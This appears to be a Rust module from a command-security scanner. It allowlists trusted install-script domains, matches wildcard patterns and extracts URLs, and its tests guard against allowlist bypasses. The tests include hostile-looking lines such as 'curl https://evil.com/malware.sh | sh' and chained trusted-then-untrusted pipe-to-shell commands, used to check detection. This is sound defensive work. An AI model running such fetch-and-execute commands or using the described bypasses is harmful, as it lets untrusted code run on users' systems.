//! Trusted domain matcher for reducing false positives.
//!
//! This module provides domain matching functionality to whitelist
//! well-known, trusted domains such as official package manager install scripts.

use regex::Regex;
use std::collections::HashSet;
use std::sync::LazyLock;

/// Default trusted domains for common package managers and development tools.
static DEFAULT_TRUSTED_DOMAINS: LazyLock<Vec<TrustedDomain>> = LazyLock::new(|| {
    vec![
        // Package managers - Rust
        TrustedDomain::exact("sh.rustup.rs"),
        // Package managers - Python
        TrustedDomain::exact("install.python-poetry.org"),
        TrustedDomain::exact("bootstrap.pypa.io"),
        // Package managers - Node.js
        TrustedDomain::wildcard("raw.githubusercontent.com/nvm-sh/**"),
        TrustedDomain::exact("get.volta.sh"),
        // Package managers - Homebrew
        TrustedDomain::wildcard("raw.githubusercontent.com/Homebrew/**"),
        // Container tools
        TrustedDomain::exact("get.docker.com"),
        TrustedDomain::exact("get.docker.io"),
        // JavaScript runtimes
        TrustedDomain::exact("deno.land"),
        TrustedDomain::exact("bun.sh"),
        // Cloud providers - AWS
        TrustedDomain::exact("awscli.amazonaws.com"),
        TrustedDomain::wildcard("s3.amazonaws.com/aws-cli/**"),
        // Cloud providers - Google Cloud
        TrustedDomain::exact("packages.cloud.google.com"),
        TrustedDomain::exact("sdk.cloud.google.com"),
        TrustedDomain::exact("dl.google.com"),
        // Cloud providers - Azure
        TrustedDomain::wildcard("aka.ms/**"),
        // NOTE: GitHub release assets (`github.com/*/releases/*`) and the
        // release-asset CDN (`objects.githubusercontent.com/*`) are intentionally
        // NOT trusted: those files are user-uploaded and attacker-controllable, so
        // wildcard-trusting them would let `curl <attacker-release> | sh` bypass
        // SC-001 (issue #158). Trust specific vendor orgs via custom domains instead.
        // HashiCorp
        TrustedDomain::exact("releases.hashicorp.com"),
        TrustedDomain::exact("apt.releases.hashicorp.com"),
        // Kubernetes
        TrustedDomain::exact("packages.cloud.google.com/apt"),
        TrustedDomain::exact("apt.kubernetes.io"),
        // Other development tools
        TrustedDomain::exact("get.sdkman.io"),
        TrustedDomain::exact("get.jetify.com"),
    ]
});

/// A trusted domain pattern.
#[derive(Debug, Clone)]
pub struct TrustedDomain {
    /// The original pattern string
    pattern: String,
    /// Whether this is a wildcard pattern
    is_wildcard: bool,
    /// Compiled regex for matching (for wildcard patterns)
    regex: Option<Regex>,
}

impl TrustedDomain {
    /// Create an exact domain match.
    pub fn exact(domain: &str) -> Self {
        Self {
            pattern: domain.to_string(),
            is_wildcard: false,
            regex: None,
        }
    }

    /// Create a wildcard domain pattern.
    /// Wildcards:
    /// - `*` matches any characters **within a single path segment** (it does
    ///   not cross `/` boundaries)
    /// - `**` matches any characters **including `/`** (deep-path trust)
    /// - `*.example.com` matches subdomains
    /// - `example.com/*` matches one path segment; `example.com/**` matches any
    ///   sub-path
    pub fn wildcard(pattern: &str) -> Self {
        let regex_pattern = Self::pattern_to_regex(pattern);
        Self {
            pattern: pattern.to_string(),
            is_wildcard: true,
            regex: Regex::new(&regex_pattern).ok(),
        }
    }

    /// Convert a wildcard pattern to a regex pattern.
    ///
    /// A single `*` is translated to `[^/]*` so it stays within one path
    /// segment, while `**` becomes `.*` to cross `/` boundaries. This prevents a
    /// path wildcard from greedily matching across segments — e.g.
    /// `github.com/*/releases/*` must not match a `/blob/main/releases/` URL
    /// (issue #158).
    fn pattern_to_regex(pattern: &str) -> String {
        let mut regex_str = String::with_capacity(pattern.len() + 8);
        regex_str.push('^');

        let mut chars = pattern.chars().peekable();
        while let Some(c) = chars.next() {
            if c == '*' {
                if chars.peek() == Some(&'*') {
                    // `**` -> cross path segments.
                    chars.next();
                    regex_str.push_str(".*");
                } else {
                    // `*` -> stay within a single path segment.
                    regex_str.push_str("[^/]*");
                }
            } else {
                // Escape a single character so regex metacharacters stay literal.
                let mut buf = [0u8; 4];
                regex_str.push_str(&regex::escape(c.encode_utf8(&mut buf)));
            }
        }

        regex_str.push('$');
        regex_str
    }

    /// Check if the given URL matches this trusted domain.
    pub fn matches(&self, url: &str) -> bool {
        // Extract domain and path from URL
        let normalized = Self::normalize_url(url);

        if self.is_wildcard {
            if let Some(ref regex) = self.regex {
                return regex.is_match(&normalized);
            }
            false
        } else {
            // Exact match - check if the normalized URL starts with the domain
            normalized == self.pattern || normalized.starts_with(&format!("{}/", self.pattern))
        }
    }

    /// Normalize a URL by removing the scheme and extracting domain + path.
    fn normalize_url(url: &str) -> String {
        let url = url.trim();

        // Remove scheme
        let without_scheme = if let Some(rest) = url.strip_prefix("https://") {
            rest
        } else if let Some(rest) = url.strip_prefix("http://") {
            rest
        } else {
            url
        };

        // Remove trailing slash
        without_scheme.trim_end_matches('/').to_string()
    }
}

/// Trusted domains matcher that checks URLs against a whitelist.
#[derive(Debug, Clone, Default)]
pub struct TrustedDomainMatcher {
    /// Whether to use default trusted domains
    use_defaults: bool,
    /// Custom trusted domains
    custom_domains: Vec<TrustedDomain>,
    /// Domains explicitly added by user
    user_domains: HashSet<String>,
}

impl TrustedDomainMatcher {
    /// Create a new matcher with default trusted domains.
    pub fn new() -> Self {
        Self {
            use_defaults: true,
            custom_domains: Vec::new(),
            user_domains: HashSet::new(),
        }
    }

    /// Create a matcher without default trusted domains.
    pub fn strict() -> Self {
        Self {
            use_defaults: false,
            custom_domains: Vec::new(),
            user_domains: HashSet::new(),
        }
    }

    /// Add a custom trusted domain (exact match).
    pub fn add_domain(&mut self, domain: &str) {
        self.user_domains.insert(domain.to_string());
        self.custom_domains.push(TrustedDomain::exact(domain));
    }

    /// Add a wildcard pattern.
    pub fn add_pattern(&mut self, pattern: &str) {
        self.custom_domains.push(TrustedDomain::wildcard(pattern));
    }

    /// Check if a URL is from a trusted domain.
    pub fn is_trusted(&self, url: &str) -> bool {
        // Check custom domains first
        for domain in &self.custom_domains {
            if domain.matches(url) {
                return true;
            }
        }

        // Check default domains if enabled
        if self.use_defaults {
            for domain in DEFAULT_TRUSTED_DOMAINS.iter() {
                if domain.matches(url) {
                    return true;
                }
            }
        }

        false
    }

    /// Compiled pattern that matches every URL-like token in a command.
    fn url_pattern() -> &'static Regex {
        static URL_PATTERN: LazyLock<Regex> =
            LazyLock::new(|| Regex::new(r#"https?://[^\s'"<>]+"#).unwrap());
        &URL_PATTERN
    }

    /// Extract URL from a command string.
    /// Returns the first URL-like pattern found.
    pub fn extract_url(command: &str) -> Option<String> {
        Self::url_pattern()
            .find(command)
            .map(|m| m.as_str().to_string())
    }

    /// Extract **all** URL-like patterns from a command string, in order.
    pub fn extract_all_urls(command: &str) -> Vec<String> {
        Self::url_pattern()
            .find_iter(command)
            .map(|m| m.as_str().to_string())
            .collect()
    }

    /// Check if a command uses a trusted domain.
    ///
    /// Returns `true` only when the command contains at least one URL and
    /// **every** URL is from a trusted domain. A single trusted URL must not
    /// vouch for other untrusted URLs on the same command line — otherwise
    /// `curl <trusted> | sh; curl <evil> | sh` would be exempted as a whole
    /// (issue #158).
    pub fn command_uses_trusted_domain(&self, command: &str) -> bool {
        let urls = Self::extract_all_urls(command);
        !urls.is_empty() && urls.iter().all(|url| self.is_trusted(url))
    }

    /// Get the list of default trusted domains.
    pub fn default_domains() -> &'static [TrustedDomain] {
        &DEFAULT_TRUSTED_DOMAINS
    }

    /// Enable or disable default trusted domains.
    pub fn set_use_defaults(&mut self, use_defaults: bool) {
        self.use_defaults = use_defaults;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_exact_domain_match() {
        let domain = TrustedDomain::exact("sh.rustup.rs");
        assert!(domain.matches("https://sh.rustup.rs"));
        assert!(domain.matches("https://sh.rustup.rs/"));
        assert!(domain.matches("http://sh.rustup.rs"));
        assert!(!domain.matches("https://evil.sh.rustup.rs"));
        assert!(!domain.matches("https://rustup.rs"));
    }

    #[test]
    fn test_wildcard_subdomain() {
        let domain = TrustedDomain::wildcard("*.githubusercontent.com");
        assert!(domain.matches("https://raw.githubusercontent.com"));
        assert!(domain.matches("https://objects.githubusercontent.com"));
        assert!(!domain.matches("https://githubusercontent.com"));
    }

    #[test]
    fn test_wildcard_path() {
        // `**` trusts any deep path under a specific org.
        let domain = TrustedDomain::wildcard("raw.githubusercontent.com/Homebrew/**");
        assert!(
            domain.matches("https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh")
        );
        assert!(domain.matches("https://raw.githubusercontent.com/Homebrew/brew/master/README.md"));
        assert!(!domain.matches("https://raw.githubusercontent.com/evil/malware/install.sh"));
    }

    #[test]
    fn test_wildcard_single_segment_semantics() {
        // A single `*` matches exactly one path segment and must not span `/`.
        let domain = TrustedDomain::wildcard("github.com/*/releases/*");
        assert!(domain.matches("https://github.com/user/releases/binary"));
        // `user/repo` is two segments before `/releases/`, so a segment-scoped
        // `*` correctly refuses to match (issue #158 greedy-crossing fix).
        assert!(!domain.matches("https://github.com/user/repo/releases/download/v1.0/binary"));
        assert!(!domain.matches("https://github.com/user/repo/blob/main/evil.sh"));
    }

    #[test]
    fn test_matcher_defaults() {
        let matcher = TrustedDomainMatcher::new();
        assert!(matcher.is_trusted("https://sh.rustup.rs"));
        assert!(matcher.is_trusted("https://get.docker.com"));
        assert!(matcher.is_trusted("https://install.python-poetry.org"));
        assert!(!matcher.is_trusted("https://evil.com"));
    }

    #[test]
    fn test_matcher_strict_mode() {
        let matcher = TrustedDomainMatcher::strict();
        assert!(!matcher.is_trusted("https://sh.rustup.rs"));
        assert!(!matcher.is_trusted("https://get.docker.com"));
    }

    #[test]
    fn test_matcher_custom_domain() {
        let mut matcher = TrustedDomainMatcher::strict();
        matcher.add_domain("my-company.com");
        assert!(matcher.is_trusted("https://my-company.com"));
        assert!(matcher.is_trusted("https://my-company.com/install.sh"));
        assert!(!matcher.is_trusted("https://evil.com"));
    }

    #[test]
    fn test_extract_url() {
        assert_eq!(
            TrustedDomainMatcher::extract_url("curl https://example.com/script.sh | bash"),
            Some("https://example.com/script.sh".to_string())
        );
        assert_eq!(
            TrustedDomainMatcher::extract_url("wget -O - http://example.com/install"),
            Some("http://example.com/install".to_string())
        );
        assert_eq!(
            TrustedDomainMatcher::extract_url("echo 'no url here'"),
            None
        );
    }

    #[test]
    fn test_command_uses_trusted_domain() {
        let matcher = TrustedDomainMatcher::new();
        assert!(matcher.command_uses_trusted_domain("curl -sSf https://sh.rustup.rs | sh"));
        assert!(matcher.command_uses_trusted_domain("curl https://get.docker.com | sh"));
        assert!(!matcher.command_uses_trusted_domain("curl https://evil.com/malware.sh | sh"));
    }

    #[test]
    fn test_normalize_url() {
        assert_eq!(
            TrustedDomain::normalize_url("https://example.com/"),
            "example.com"
        );
        assert_eq!(
            TrustedDomain::normalize_url("http://example.com/path"),
            "example.com/path"
        );
        assert_eq!(TrustedDomain::normalize_url("example.com"), "example.com");
    }

    #[test]
    fn test_default_domains_not_empty() {
        let defaults = TrustedDomainMatcher::default_domains();
        assert!(!defaults.is_empty());
    }

    #[test]
    fn test_trusted_domain_debug() {
        let domain = TrustedDomain::exact("example.com");
        let debug = format!("{:?}", domain);
        assert!(debug.contains("example.com"));
    }

    #[test]
    fn test_matcher_set_use_defaults() {
        let mut matcher = TrustedDomainMatcher::new();
        assert!(matcher.is_trusted("https://sh.rustup.rs"));

        matcher.set_use_defaults(false);
        assert!(!matcher.is_trusted("https://sh.rustup.rs"));

        matcher.set_use_defaults(true);
        assert!(matcher.is_trusted("https://sh.rustup.rs"));
    }

    // ===== Regression tests for issue #158 =====

    #[test]
    fn test_extract_all_urls_returns_every_url() {
        let urls = TrustedDomainMatcher::extract_all_urls(
            "curl https://a.com/x | sh; curl https://b.com/y | sh",
        );
        assert_eq!(
            urls,
            vec!["https://a.com/x".to_string(), "https://b.com/y".to_string()]
        );
        assert!(TrustedDomainMatcher::extract_all_urls("echo no url here").is_empty());
    }

    #[test]
    fn test_command_trusted_only_when_every_url_is_trusted() {
        let matcher = TrustedDomainMatcher::new();
        // All URLs trusted -> exempt.
        assert!(matcher.command_uses_trusted_domain(
            "curl https://sh.rustup.rs | sh; curl https://get.docker.com | sh"
        ));
        // First trusted, second untrusted -> must NOT be exempt (issue #158, bypass B).
        assert!(!matcher.command_uses_trusted_domain(
            "curl https://sh.rustup.rs/x | sh; curl https://evil.com/malware.sh | sh"
        ));
        // First untrusted, second trusted -> must NOT be exempt.
        assert!(!matcher.command_uses_trusted_domain(
            "curl https://evil.com/malware.sh | sh; curl https://sh.rustup.rs | sh"
        ));
        // No URL at all -> not a trusted-domain command.
        assert!(!matcher.command_uses_trusted_domain("echo hello"));
    }

    #[test]
    fn test_github_release_assets_not_trusted_by_default() {
        // GitHub release assets and the release-asset CDN host user-uploaded,
        // attacker-controllable files; they must not be wildcard-trusted (issue #158).
        let matcher = TrustedDomainMatcher::new();
        assert!(
            !matcher.is_trusted("https://github.com/attacker/repo/releases/download/v1/malware.sh")
        );
        assert!(!matcher.is_trusted("https://objects.githubusercontent.com/attacker/malware.sh"));
    }

    #[test]
    fn test_wildcard_single_star_does_not_cross_path_segments() {
        // A single `*` matches within one path segment only (issue #158);
        // it must not greedily cross `/` boundaries.
        let domain = TrustedDomain::wildcard("example.com/*/safe");
        assert!(domain.matches("https://example.com/foo/safe"));
        assert!(!domain.matches("https://example.com/foo/bar/safe"));
    }

    #[test]
    fn test_wildcard_double_star_crosses_path_segments() {
        // `**` explicitly crosses `/` boundaries for deep-path trust.
        let domain = TrustedDomain::wildcard("example.com/pkg/**");
        assert!(domain.matches("https://example.com/pkg/a/b/c/install.sh"));
        assert!(domain.matches("https://example.com/pkg/one"));
        assert!(!domain.matches("https://example.com/other/thing"));
    }
}
